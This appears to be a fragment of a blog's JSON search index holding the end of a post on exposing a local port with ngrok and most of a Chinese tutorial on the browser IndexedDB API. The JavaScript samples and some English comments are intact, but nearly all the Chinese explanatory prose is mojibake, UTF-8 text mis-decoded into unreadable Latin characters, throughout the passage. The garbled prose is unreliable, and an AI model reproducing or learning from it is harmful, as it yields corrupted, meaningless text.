é€™å€‹åƒæ•¸å°±å¯ä»¥è¨­å®šå¯†ç¢¼ä¿è­·ã€‚ä¾‹å¦‚ï¼š 1 ngrok http --auth=admin:12345 3000 æ„æ€æ˜¯ï¼Œè³¬è™Ÿè¦æ˜¯adminï¼Œè€Œå¯†ç¢¼æ˜¯12345 map åˆ° 3000 portã€‚ é‡å¯« hostname æœ‰äº›æœå‹™æœƒä½¿ç”¨åˆ° hostname çš„å€¼ï¼Œé€™å€‹æ™‚å€™é‡å¯« hostname çš„åŠŸèƒ½å°±è®Šå¾—å¾ˆé‡è¦ã€‚å¯ä»¥ä½¿ç”¨ host-header åšè¨­å®šã€‚ é€™é‚Šçš„ä¾‹å­ç”¨çš„æ˜¯åœ¨ IIS è£é¢è¨­å®šåªæœ‰ test.com æ‰æœƒ binding åˆ° 80 portï¼Œä½¿ç”¨çš„æŒ‡ä»¤å°±æ˜¯ï¼š 1 ngrok http --host-header=test.com 80 ","date":"2022-09-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52384429631_a48959b2b8_o.png","permalink":"https://wayneblog.ga/2022-09-26/ngrok-basic/","title":"é€é ngrok ç”¢ç”Ÿè‡¨æ™‚ç”¨çš„ç¶²å€åˆ°æŒ‡å®šæ©Ÿå™¨"},{"content":" åƒè€ƒç¶²ç«™1\nåƒè€ƒç¶²ç«™2\nIndexedDB ä»‹ç´¹ key-value çš„å„²å­˜å½¢å¼ï¼Œé€éç´¢å¼•åŠŸèƒ½ä¾†é«˜æ•ˆç‡æœå°‹è³‡æ–™ã€‚ åŒæºæ”¿ç­– same-origin policyï¼šåªèƒ½å–ç”¨åŒç¶²åŸŸä¸‹çš„è³‡æ–™ã€‚ Async API : æä¾›éåŒæ­¥ apiï¼Œå–®ç·šç¨‹çš„æ‡‰ç”¨ä¸‹å–ç”¨è³‡æ–™æ™‚å°±ä¸æœƒæœ‰ block the main thread çš„æƒ…æ³é€ æˆä½¿ç”¨è€…é«”é©—ä¸ä½³ã€‚ transaction : èƒ½å¤ ç¢ºä¿å¤§é‡å¯«å…¥è³‡æ–™æ™‚çš„å®Œæ•´æ€§ï¼Œå¦‚æœæœ‰å–®ç­†è³‡æ–™å¯«å…¥å¤±æ•—æœƒå…¨æ•¸ rollbackã€‚ ç›¸å®¹æ€§ å¤§éƒ¨åˆ†çš„ç€è¦½å™¨éƒ½å·²ç¶“æ”¯æ´ä½¿ç”¨ï¼Œåƒé–±ï¼šWhen Can I Use IndexedDB å„²å­˜é™åˆ¶ å–®ä¸€è³‡æ–™åº«é …ç›®çš„å®¹é‡/å¤§å°ä¸¦æ²’æœ‰ä»»ä½•é™åˆ¶ï¼Œä½†æ˜¯å„å€‹ IndexedDBè³‡æ–™åº«çš„å®¹é‡å°±æœ‰é™åˆ¶ï¼Œä¸”æ ¹æ“šå„ç€è¦½å™¨å…¶é™åˆ¶æœƒä¸åŒã€‚\nChromeï¼šå…è¨±ç€è¦½å™¨ä½¿ç”¨å¤šé”ç¸½ç£ç›¤ç©ºé–“çš„60ï¼…ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨StorageManager APIä¾†ç¢ºå®šå¯ç”¨çš„æœ€å¤§é…é¡ã€‚ å…¶ä»–åŸºæ–¼Chromiumçš„ç€è¦½å™¨å¯èƒ½å…è¨±è©²ç€è¦½å™¨ä½¿ç”¨æ›´å¤šå­˜å„²ç©ºé–“ã€‚ Internet Explorer 10 å’Œæ›´é«˜ç‰ˆæœ¬ï¼šæœ€å¤šå¯ä»¥å­˜å„²250MBï¼Œä¸¦ä¸”åœ¨ä½¿ç”¨äº†10MBä»¥ä¸Šæ™‚å°‡æç¤ºç”¨æˆ¶ã€‚ Firefoxï¼šå…è¨±ä¸€å€‹ä¾†æºæœ€å¤šä½¿ç”¨2GBã€‚ æ‚¨å¯ä»¥ä½¿ç”¨StorageManager APIä¾†ç¢ºå®šä»æœ‰å¤šå°‘å¯ç”¨ç©ºé–“ã€‚ Safari (both desktop and mobile) ä¼¼ä¹æœ€å¤šå¯å®¹ç´1GBï¼Œé”åˆ°é™åˆ¶å¾Œï¼ŒSafariæœƒæç¤ºç”¨æˆ¶ï¼Œä»¥200MBç‚ºå¢é‡å¢åŠ é™åˆ¶ã€‚ refer to storage-for-the-web\nè³‡æ–™éµ(Key) data type: string, date, floatå’Œ array å¿…é ˆæ˜¯èƒ½æ’åºçš„å€¼(ç„¡æ³•è™•ç†å¤šåœ‹èªè¨€å­—ä¸²æ’åº) ç‰©ä»¶å­˜æª”æœ‰ä¸‰ç¨®æ–¹å¼ç”¢ç”Ÿè³‡æ–™éµ: è³‡æ–™éµç”¢ç”Ÿå™¨ (key generator)ã€è³‡æ–™éµè·¯å¾‘ (key path) ä»¥åŠæŒ‡å®šå€¼ã€‚ è³‡æ–™éµç”¢ç”Ÿå™¨ (key generator)ï¼šç”¨ç”¢ç”Ÿå™¨è‡ªå‹•ç”¢ç”Ÿè³‡æ–™éµã€‚ è³‡æ–™éµè·¯å¾‘ (key path)ï¼šç©ºå­—ä¸²æˆ–æ˜¯javascript identifierï¼ˆåŒ…å«ç”¨ \u0026ldquo;.\u0026rdquo; åˆ†éš”ç¬¦è™Ÿçš„åç¨±ï¼‰ä¸”è·¯å¾‘ä¸èƒ½æœ‰ç©ºç™½ (å¯¦æ¸¬éä¸­æ–‡æœƒè¢«è½‰æˆç©ºå­—ä¸²)ã€‚ åŸºæœ¬æ“ä½œæ­¥é©Ÿ æ“ä½œIndexedDBçš„åŸºæœ¬æ­¥é©Ÿå»ºè­°å¦‚ä¸‹ï¼š é–‹å•Ÿè³‡æ–™åº«å’Œäº¤æ˜“(transaction) å»ºç«‹ç‰©ä»¶å­˜æª”(object store) ç™¼å‡ºè³‡æ–™åº«æ“ä½œè«‹æ±‚ï¼Œä¾‹å¦‚æ–°å¢æˆ–å–å¾—è³‡æ–™ è†è½å°æ‡‰DOMäº‹ä»¶ç­‰å¾…æ“ä½œå®Œæˆ å¾resultç‰©ä»¶ä¸Šå–å¾—çµæœé€²è¡Œå…¶ä»–å·¥ä½œ ä½¿ç”¨æ–¹å¼ 1. è©¦é©—ç€è¦½å™¨çš„å‰ç¶´æ¨™ç¤º å¦‚æœéœ€è¦è©¦é©—ç€è¦½å™¨çš„å‰ç¶´æ¨™ç¤ºï¼Œå¯ä»¥å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 // In the following line, you should include the prefixes of implementations you want to test. window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; // DON\u0026#39;T use \u0026#34;var indexedDB = ...\u0026#34; if you\u0026#39;re not in a function. // Moreover, you may need references to some window.IDB* objects: window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; // (Mozilla has never prefixed these objects, so we don\u0026#39;t need window.mozIDB*) è«‹æ³¨æ„ç€è¦½å™¨å‰ç¶´æ¨™ç¤ºçš„å¯¦ä½œå¯èƒ½ä¸å®Œæ•´ã€æœ‰äº›å•é¡Œæˆ–ä»ç„¶éµå®ˆèˆŠç‰ˆæ¨™æº–ï¼Œå› æ­¤ä¸å»ºè­°åœ¨æ­£å¼ç‰ˆç¨‹å¼ç¢¼ä¸­ä½¿ç”¨ã€‚èˆ‡å…¶å®£ç¨±æ”¯æ´åˆæœ‰å•é¡Œï¼Œå€’ä¸å¦‚ç›´æ¥ä¸æ”¯æ´ã€‚ 1 2 3 if (!window.indexedDB) { window.alert(\u0026#34;Your browser doesn\u0026#39;t support a stable version of IndexedDB. Such and such feature will not be available.\u0026#34;); } 2. é–‹å•Ÿè³‡æ–™åº« 1 2 3 4 5 6 7 8 9 // Let us open database let request = window.indexedDB.open(\u0026#34;DBåç¨±\u0026#34;, 3); request.onerror = function(event) { // Do something with request.errorCode! }; request.onsuccess = function(event) { // Do something with request.result! }; é–‹å•Ÿè«‹æ±‚ä¸¦ä¸æœƒç«‹åˆ»é–‹å•Ÿè³‡æ–™åº«æˆ–äº¤æ˜“ï¼Œå‘¼å«open()æ–¹æ³•æœƒå›å‚³ä¸€å€‹IDBOpenDBRequestç‰©ä»¶ï¼Œé€™å€‹ç‰©ä»¶æ“æœ‰å…©å€‹äº‹ä»¶(success å’Œ error)ã€‚å¤§éƒ¨åˆ†IndexedDBçš„éåŒæ­¥åŠŸèƒ½éƒ½æœƒå›å‚³ä¸€å€‹IDBDatabaseé¡ç‰©ä»¶ï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥è¨»å†ŠæˆåŠŸå’Œå¤±æ•—äº‹ä»¶è™•ç†å™¨ã€‚ .open()æ–¹æ³•ç¬¬äºŒå€‹åƒæ•¸æ˜¯è³‡æ–™åº«ç‰ˆæœ¬ï¼Œè³‡æ–™åº«ç‰ˆæœ¬æ±ºå®šäº†è³‡æ–™åº«çµæ§‹ï¼Œä¹Ÿå°±æ˜¯è³‡æ–™åº«ç‰©ä»¶å­˜æª”çš„çµæ§‹ã€‚å¦‚æœè«‹æ±‚ç‰ˆæœ¬ä¸å­˜åœ¨(æ¯”å¦‚å› ç‚ºé€™æ˜¯ä¸€å€‹æ–°è³‡æ–™åº«æˆ–æ˜¯è³‡æ–™åº«ç‰ˆæœ¬å·²å‡ç´š)ï¼Œonupgradeneededäº‹ä»¶æœƒè¢«è§¸ç™¼ï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥åœ¨onupgradeneededäº‹ä»¶è™•ç†å™¨ä¸­å†å»ºç«‹æ–°çš„ç‰ˆæœ¬ï¼Œä¸‹é¢å‡ç´šè³‡æ–™åº«ç‰ˆæœ¬æœ‰æ›´è©³ç´°çš„èªªæ˜ã€‚ 3. ä½¿ç”¨è³‡æ–™éµç”¢ç”Ÿå™¨ ç•¶å»ºç«‹ç‰©ä»¶å­˜æª”æ™‚è¨­å®šautoIncrementæ——æ¨™ç‚ºtureå°‡å•Ÿå‹•è³‡æ–™éµç”¢ç”Ÿå™¨ï¼Œé è¨­ä¸Šè©²æ——æ¨™ç‚ºfalseã€‚ æœ‰äº†è³‡æ–™éµç”¢ç”Ÿå™¨ï¼Œç•¶æ–°å¢è³‡æ–™åˆ°ç‰©ä»¶å­˜æª”ä¸­ï¼Œè³‡æ–™éµç”¢ç”Ÿå™¨æœƒè‡ªå‹•å¹«æˆ‘å€‘ç”¢ç”Ÿè³‡æ–™éµã€‚è³‡æ–™éµç”¢ç”Ÿå™¨ç”¢ç”Ÿçš„è³‡æ–™éµç”±æ•´æ•¸1é–‹å§‹ï¼Œè€ŒåŸºæœ¬ä¸Šæ–°ç”¢ç”Ÿçš„è³‡æ–™éµæ˜¯ç”±å‰ä¸€å€‹è³‡æ–™éµåŠ 1ç”¢ç”Ÿã€‚è³‡æ–™éµçš„ç”¢ç”Ÿä¸æœƒå› ç‚ºè³‡æ–™åˆªé™¤æˆ–æ¸…ç©ºæ‰€æœ‰è³‡æ–™è€Œé‡æ–°é–‹å§‹èµ·ç®—ï¼Œæ‰€ä»¥è³‡æ–™éµå€¼æ˜¯ä¸€ç›´ç´¯åŠ ä¸Šå»çš„ï¼Œé™¤éè³‡æ–™åº«æ“ä½œä¸­æ–·ï¼Œæ•´å€‹äº¤æ˜“ä½œæ¥­è¢«å–æ¶ˆã€‚ æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹æœ‰è³‡æ–™éµç”¢ç”Ÿå™¨çš„ç‰©ä»¶å­˜æª”å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Open the indexedDB. var request = indexedDB.open(dbName, 3); request.onupgradeneeded = function (event) { var db = event.target.result; // Create another object store called \u0026#34;names\u0026#34; with the autoIncrement flag set as true. var objStore = db.createObjectStore(\u0026#34;names\u0026#34;, { autoIncrement : true }); // Because the \u0026#34;names\u0026#34; object store has the key generator, the key for the name value is generated automatically. // The added records would be like: // key : 1 =\u0026gt; value : \u0026#34;Bill\u0026#34; // key : 2 =\u0026gt; value : \u0026#34;Donna\u0026#34; for (var i in customerData) { objStore.add(customerData[i].name); } } é—œæ–¼è³‡æ–™éµç”¢ç”Ÿå™¨ç´°ç¯€ï¼Œè«‹åƒè€ƒ\u0026ldquo;W3C Key Generators\u0026rdquo;ã€‚\n4. æ–°å¢å’Œåˆªé™¤è³‡æ–™ åœ¨æ“ä½œè³‡æ–™åº«ä¹‹å‰å¿…é ˆè¦å…ˆé€²è¡Œäº¤æ˜“ï¼Œäº¤æ˜“ä¾†è‡ªè³‡æ–™åº«ç‰©ä»¶ï¼Œåœ¨äº¤æ˜“ä¸­è¦æŒ‡å®šæ¶µè“‹ç‰©ä»¶å­˜æª”ç¯„åœï¼Œç„¶å¾Œä¹Ÿè¦æ±ºå®šæ˜¯è¦è®Šæ›´è³‡æ–™åº«æˆ–ç´”ç²¹è®€å–è³‡æ–™ã€‚ äº¤æ˜“å…±æœ‰ä¸‰ç¨®ç¨®é¡ï¼Œåˆ†åˆ¥æ˜¯è®€å–(read-only)ï¼Œè®€å¯«(read/write), ä»¥åŠç‰ˆæœ¬è®Šæ›´(versionchange)ï¼Œå¦‚æœåªéœ€è¦è®€è³‡æ–™æœ€å¥½åªä½¿ç”¨è®€å–(read-only)äº¤æ˜“ï¼Œå› ç‚ºè®€å–(read-only)äº¤æ˜“å¯ä»¥å¤šé‡åŒæ­¥é€²è¡Œã€‚ å‰µå»ºè³‡æ–™åº«å¾Œï¼Œå¦‚æœè¦å¯«å…¥è³‡æ–™è«‹é€™éº¼åšï¼š 1 2 3 4 var transaction = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;); // Note: Older experimental implementations use the deprecated constant IDBTransaction.READ_WRITE instead of \u0026#34;readwrite\u0026#34;. // In case you want to support such an implementation, you can just write: // var transaction = db.transaction([\u0026#34;customers\u0026#34;], IDBTransaction.READ_WRITE); å‘¼å« transaction() æ–¹æ³•æœƒå›å‚³ä¸€å€‹äº¤æ˜“ç‰©ä»¶ã€‚transaction()ç¬¬ä¸€å€‹æ¥å—åƒæ•¸ä»£è¡¨äº¤æ˜“æ¶µè“‹çš„ç‰©ä»¶å­˜æª”ï¼Œé›–ç„¶å‚³å…¥ç©ºé™£åˆ—æœƒè®“äº¤æ˜“æ¶µè“‹æ‰€æœ‰ç‰©ä»¶å­˜æª”ï¼Œä½†è«‹ä¸è¦é€™éº¼åšï¼Œå› ç‚ºæ ¹æ“šæ­£å¼æ¨™æº–å‚³å…¥ç©ºé™£åˆ—æ‡‰è©²è¦å°è‡´InvalidAccessErroréŒ¯èª¤ï¼›ç¬¬äºŒå€‹åƒæ•¸ä»£è¡¨äº¤æ˜“ç¨®é¡ï¼Œä¸å‚³å…¥çš„è©±é è¨­ç‚ºè®€å–äº¤æ˜“ï¼Œæœ¬ä¾‹è¦å¯«å…¥è³‡æ–™åº«æ‰€ä»¥å‚³å…¥è®€å¯«(\u0026ldquo;readwrite\u0026rdquo;)ã€‚ äº¤æ˜“çš„ç”Ÿå‘½é€±æœŸå’Œäº‹ä»¶å¾ªç’°é—œä¿‚å¯†åˆ‡ã€‚ç•¶æˆ‘å€‘ç™¼èµ·äº¤æ˜“åˆå›åˆ°äº‹ä»¶å¾ªç’°ä¸­å¾Œï¼Œå¦‚æœå¿½ç•¥ï¼Œé‚£éº¼äº¤æ˜“å°‡è½‰æˆçµæŸï¼Œå”¯ä¸€ä¿æŒäº¤æ˜“å­˜æ´»çš„æ–¹æ³•æ˜¯åœ¨äº¤æ˜“ä¸Šç™¼å‡ºè«‹æ±‚ï¼›ç•¶è«‹æ±‚å®Œæˆå¾Œæˆ‘å€‘æœƒæ”¶åˆ°DOMäº‹ä»¶ï¼Œå‡è¨­è«‹æ±‚çµæœæˆåŠŸï¼Œæˆ‘å€‘å¯ä»¥åœ¨äº‹ä»¶çš„å›å‘¼å‡½æ•¸(callbackä¸­)ç¹¼çºŒé€²è¡Œäº¤æ˜“ï¼Œåä¹‹ï¼Œå¦‚æœæˆ‘å€‘æ²’æœ‰ç¹¼çºŒé€²è¡Œäº¤æ˜“ï¼Œé‚£éº¼äº¤æ˜“å°‡çµæŸï¼Œä¹Ÿå°±æ˜¯èªªåªè¦å°šæœ‰æœªå®Œæˆè«‹æ±‚çš„è©±ï¼Œäº¤æ˜“å°±æœƒç¹¼çºŒå­˜æ´»ï¼Œå¦‚æœæ”¶åˆ°TRANSACTION_INACTIVE_ERRéŒ¯èª¤é‚£ä¾¿æ„è¬‚è‘—äº¤æ˜“æ—©å·²çµæŸï¼Œæˆ‘å€‘éŒ¯éäº†ç¹¼çºŒé€²è¡Œäº¤æ˜“çš„æ©Ÿæœƒã€‚ äº¤æ˜“èƒ½æ”¶åˆ°ä¸‰ç¨®äº‹ä»¶: éŒ¯èª¤(error)ã€ä¸­æ–·(abort)ä»¥åŠå®Œæˆ(complete)ï¼Œå…¶ä¸­éŒ¯èª¤äº‹ä»¶æœƒå‘ä¸Šå‚³éï¼Œæ‰€ä»¥ä»»ä½•ä¸€å€‹äº¤æ˜“ä¸‹è½„çš„è«‹æ±‚ç”¢ç”ŸéŒ¯èª¤äº‹ä»¶ï¼Œè©²äº¤æ˜“éƒ½æœƒæ”¶åˆ°ã€‚å¦‚æœäº¤æ˜“æ”¶åˆ°éŒ¯èª¤äº‹ä»¶æ™‚ï¼Œç€è¦½å™¨é è¨­è¡Œç‚ºæœƒä¸­æ–·äº¤æ˜“ï¼Œé™¤éæˆ‘å€‘æœ‰åœ¨éŒ¯èª¤äº‹ä»¶ä¸Šå‘¼å«preventDefault()é˜»æ“‹ç€è¦½å™¨é è¨­è¡Œå‹•ï¼Œå¦å‰‡æ•´ç­†äº¤æ˜“éƒ½å°‡å–æ¶ˆã€å¾©åŸï¼Œé€™æ¨£çš„è¨­è¨ˆå‘Šè¨´æˆ‘å€‘å¿…é ˆè¦æ€è€ƒå¦‚ä½•è™•è£¡éŒ¯èª¤ï¼Œæˆ–è€…èªªå¦‚æœå°æ¯ä¸€å€‹éŒ¯èª¤é€²è¡Œè™•è£¡éæ–¼éº»ç…©ï¼Œé‚£éº¼è‡³å°‘åŠ å…¥ä¸€å€‹æ¦‚æ‹¬æ€§çš„éŒ¯èª¤è™•ç†å™¨ä¹Ÿæ˜¯å¯ä»¥ã€‚åªè¦ä¸è™•è£¡éŒ¯èª¤æˆ–å‘¼å«abort()ï¼Œäº¤æ˜“å°‡å–æ¶ˆã€å¾©åŸï¼Œç„¶å¾Œä¸­æ–·äº‹ä»¶æ¥è‘—è§¸ç™¼ï¼Œåä¹‹ï¼Œç•¶æ‰€æœ‰è«‹æ±‚éƒ½å®Œæˆå¾Œï¼Œæˆ‘å€‘æœƒæ”¶åˆ°ä¸€å€‹å®Œæˆäº‹ä»¶ï¼Œæ‰€ä»¥èªªå¦‚æœæˆ‘å€‘åŒæ™‚ç™¼èµ·å¤šé …è«‹æ±‚æ™‚ï¼Œå¯ä»¥åªè¿½è¹¤å–®ä¸€äº¤æ˜“è€Œéå€‹åˆ¥è«‹æ±‚ï¼Œé€™æ¨£æœƒå¤§å¤§æ¸›è¼•æˆ‘å€‘çš„è² æ“”ã€‚ æœ‰äº†äº¤æ˜“ä¹‹å¾Œä¾¿èƒ½å¤ å¾ä¸­å–å¾—ç‰©ä»¶å­˜æª”ï¼Œæœ‰äº†ç‰©ä»¶å­˜æª”ä¾¿èƒ½å¤ æ–°å¢è³‡æ–™(è«‹æ³¨æ„å”¯æœ‰åœ¨å»ºç«‹äº¤æ˜“æ™‚æŒ‡å®šçš„ç‰©ä»¶å­˜æª”èƒ½å¤ å–å¾—)ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Do something when all the data is added to the database. transaction.oncomplete = function(event) { alert(\u0026#34;All done!\u0026#34;); }; transaction.onerror = function(event) { // Don\u0026#39;t forget to handle errors! }; var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); for (var i in customerData) { var request = objectStore.add(customerData[i]); request.onsuccess = function(event) { // event.target.result == customerData[i].ssn; }; } å‘¼å« add() æ–¹æ³•å¯ä»¥åŠ å…¥ä¸€ç­†æ–°è³‡æ–™ï¼Œå‘¼å«å¾Œæœƒå›å‚³ä¸€å€‹IDBRequestç‰©ä»¶ï¼Œå³ç‚ºä¸Šæ–¹ç¯„ä¾‹ä¸­çš„requestï¼Œå¦‚æœæ–°å¢æˆåŠŸï¼Œrequestçš„æˆåŠŸäº‹ä»¶æœƒè¢«è§¸ç™¼ï¼Œè€ŒæˆåŠŸäº‹ä»¶ç‰©ä»¶ä¸­æœ‰ä¸€å€‹resultå±¬æ€§ï¼Œé€™å€‹resultå€¼å‰›å¥½å°±ç­‰æ–¼æ–°è³‡æ–™çš„è³‡æ–™éµï¼Œæ‰€ä»¥èªªä¸Šæ–¹ç¯„ä¾‹ä¸­çš„event.target.resultå‰›å¥½å°±ç­‰æ–¼é¡§å®¢çš„ssnå€¼(å› ç‚ºæˆ‘å€‘ç”¨ssnå±¬æ€§ä½œç‚ºè³‡æ–™éµè·¯å¾‘)ã€‚è«‹æ³¨æ„addæ–¹æ³•åªåœ¨ç•¶ç‰©ä»¶å­˜æª”ä¸­æ²’æœ‰ç›¸åŒè³‡æ–™éµè³‡æ–™å­˜åœ¨æ™‚æœ‰ç”¨ï¼Œå¦‚æœæƒ³è¦æ›´å‹•æˆ–æ˜¯ç›´æ¥è¦†è“‹ç¾å­˜è³‡æ–™è«‹å‘¼å«putæ–¹æ³•ã€‚ 5. ç§»é™¤è³‡æ–™ ç§»é™¤è³‡æ–™ååˆ†å®¹æ˜“ï¼š 1 2 3 4 var request = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).delete(\u0026#34;444-44-4444\u0026#34;); request.onsuccess = function(event) { // It\u0026#39;s gone! }; 6. è®€å–è³‡æ–™ è¦å–è³‡æ–™åº«å…§çš„è³‡æ–™æœ‰æ•¸ç¨®é€”å¾‘ï¼Œç¬¬ä¸€å€‹æœ€ç°¡å–®çš„é€”å¾‘å°±æ˜¯æä¾›è³‡æ–™éµï¼Œå‘¼å« get() æ–¹æ³•å–å¾—è³‡æ–™ï¼š 1 2 3 4 5 6 7 8 9 10 var transaction = db.transaction([\u0026#34;customers\u0026#34;]); var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); var request = objectStore.get(\u0026#34;444-44-4444\u0026#34;); request.onerror = function(event) { // Handle errors! }; request.onsuccess = function(event) { // Do something with the request.result! alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + request.result.name); }; å‡è¨­æˆ‘å€‘æŠŠéŒ¯èª¤è™•ç†æ”¾åœ¨è³‡æ–™åº«å±¤ç´šï¼Œæˆ‘å€‘å¯ä»¥å†ç¸®çŸ­ä¸Šé¢çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š 1 2 3 db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).get(\u0026#34;444-44-4444\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + event.target.result.name); }; å‘¼å« transcation æ–¹æ³•è€Œä¸æŒ‡å®šæ¨¡å¼æœƒé–‹å•Ÿè®€å–(readonly)æ¨¡å¼ï¼Œæ¥è‘—å–å¾—æˆ‘å€‘çš„ç›®æ¨™ç‰©ä»¶å­˜æª”ï¼Œè¼¸å…¥ç›®æ¨™è³‡æ–™çš„è³‡æ–™éµï¼Œå‘¼å«getæ–¹æ³•å–å¾—è«‹æ±‚ç‰©ä»¶ï¼Œç„¶å¾Œåœ¨è«‹æ±‚ç‰©ä»¶ä¸Šè¨»å†ŠæˆåŠŸäº‹ä»¶è™•ç†å™¨ï¼Œç•¶ä½œæ¥­æˆåŠŸå¾Œï¼ŒæˆåŠŸäº‹ä»¶æœƒè§¸ç™¼ï¼ŒæˆåŠŸäº‹ä»¶çš„ç‰©ä»¶ä¸­å«æœ‰è«‹æ±‚ç‰©ä»¶(event.targetå¦‚ä¸Šè¿°ç¯„ä¾‹)ï¼Œè«‹æ±‚ç‰©ä»¶ä¸­å«æœ‰è«‹æ±‚çµæœ(event.target.resultå¦‚ä¸Šè¿°ç¯„ä¾‹)ã€‚ 7. ä½¿ç”¨æŒ‡æ¨™(Cursor) ä½¿ç”¨getæ–¹æ³•éœ€è¦çŸ¥é“è³‡æ–™éµï¼Œå¦‚æœæƒ³è¦ä¸€ä¸€å­˜å–ç‰©ä»¶å­˜æª”ä¸­çš„è³‡æ–™ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨æŒ‡æ¨™ï¼š 1 2 3 4 5 6 7 8 9 10 11 var objectStore = db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;); objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { alert(\u0026#34;Name for SSN \u0026#34; + cursor.key + \u0026#34; is \u0026#34; + cursor.value.name); cursor.continue(); } else { alert(\u0026#34;No more entries!\u0026#34;); } }; openCursor æ–¹æ³•ç¬¬ä¸€å€‹åƒæ•¸ç”¨ä¾†æ¥å—è³‡æ–™éµç¯„åœç‰©ä»¶ä¾†é™åˆ¶å­˜å–è³‡æ–™ç¯„åœï¼Œç¬¬äºŒå€‹åƒæ•¸ç”¨ä¾†æŒ‡å®šå­˜å–é€²è¡Œæ–¹å‘ï¼Œåƒä¸Šé¢çš„ç¯„ä¾‹ç¨‹å¼ä¾¿æ˜¯ä»¥è³‡æ–™éµç”±å°åˆ°å¤§ä¹‹æ–¹å‘å­˜å–è³‡æ–™ï¼›å‘¼å«openCursoræ–¹æ³•å¾Œä¸€æ¨£æœƒå›å‚³ä¸€å€‹è«‹æ±‚ç‰©ä»¶ï¼ŒæˆåŠŸæ™‚æˆåŠŸäº‹ä»¶æœƒè§¸ç™¼ï¼Œä¸éé€™è£¡æœ‰äº›åœ°æ–¹è¦ç‰¹åˆ¥æ³¨æ„ï¼Œç•¶æˆåŠŸäº‹ä»¶è™•è£¡å‡½æ•¸è¢«å–šèµ·æ™‚ï¼ŒæŒ‡æ¨™ç‰©ä»¶(cursor)æœƒå­˜æ”¾åœ¨resultå±¬æ€§å…§(äº¦å³ä¸Šè¿°event.target.result)ï¼Œcursorç‰©ä»¶ä¸‹æœ‰å…©å€‹å±¬æ€§ï¼Œkeyå±¬æ€§æ˜¯è³‡æ–™éµï¼Œvalueå±¬æ€§æ˜¯è³‡æ–™å€¼ï¼Œå¦‚æœè¦å–å¾—ä¸‹ä¸€ä»½è³‡æ–™å°±å‘¼å«cursorçš„continue()æ–¹æ³•ï¼Œç„¶å¾Œcursorç‰©ä»¶å°±æœƒæŒ‡å‘ä¸‹ä¸€ä»½è³‡æ–™ï¼Œç•¶æ²’æœ‰è³‡æ–™æ™‚ï¼Œcursoræœƒæ˜¯undefinedï¼Œç•¶è«‹æ±‚ä¸€é–‹å§‹ä¾¿æ‰¾æ²’æœ‰è³‡æ–™ï¼Œresultå±¬æ€§ä¹Ÿæœƒæ˜¯undefinedã€‚ ä»¥ä¸‹ç”¨cursorå­˜å–ä¸€éè³‡æ–™å¾Œæ”¾åœ¨é™£åˆ—ä¸­çš„ä½œæ³•ç›¸ç•¶å¸¸è¦‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 var customers = []; objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { customers.push(cursor.value); cursor.continue(); } else { alert(\u0026#34;Got all customers: \u0026#34; + customers); } }; Warning: ä»¥ä¸‹ç¯„ä¾‹ä¸æ˜¯IndexedDBæ¨™æº–!\nMozillaç€è¦½å™¨è‡ªå·±åšäº†ä¸€å€‹ getAll() æ–¹æ³•ä¾†æ–¹ä¾¿ä¸€æ¬¡å–å¾—æ‰€æœ‰cursorä¸‹çš„è³‡æ–™å€¼ï¼Œé€™å€‹æ–¹æ³•ç›¸ç•¶æ–¹ä¾¿ï¼Œä¸éè«‹å°å¿ƒæœªä¾†å®ƒæœ‰å¯èƒ½æœƒæ¶ˆå¤±ã€‚ä»¥ä¸‹ç¨‹å¼ç¢¼çš„æ•ˆæœå’Œä¸Šé¢çš„ä¸€æ¨£ï¼š 1 2 3 objectStore.getAll().onsuccess = function(event) { alert(\u0026#34;Got all customers: \u0026#34; + event.target.result); }; ä¸€ä¸€æª¢æŸ¥cursorçš„valueå±¬æ€§è¼ƒä¸åˆ©æ€§èƒ½è¡¨ç¾ï¼Œå› ç‚ºç‰©ä»¶æ˜¯è¢«å‹•ä¸€ä¸€å»ºç«‹ï¼Œç„¶è€Œå‘¼å« getAll()ï¼ŒGeckoä¸€å®šè¦ä¸€æ¬¡å»ºç«‹æ‰€æœ‰ç‰©ä»¶ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦ä¸€æ¬¡å–å¾—æ‰€æœ‰ç‰©ä»¶çš„è³‡æ–™å€¼é™£åˆ—ä½¿ç”¨ getAll() æ¯”è¼ƒå¥½ï¼Œå¦‚æœæƒ³è¦ä¸€ä¸€æª¢æŸ¥æ¯ç­†è³‡æ–™å‰‡è«‹åˆ©ç”¨cursorçš„æ–¹æ³•ã€‚ 8. ä½¿ç”¨ç´¢å¼• 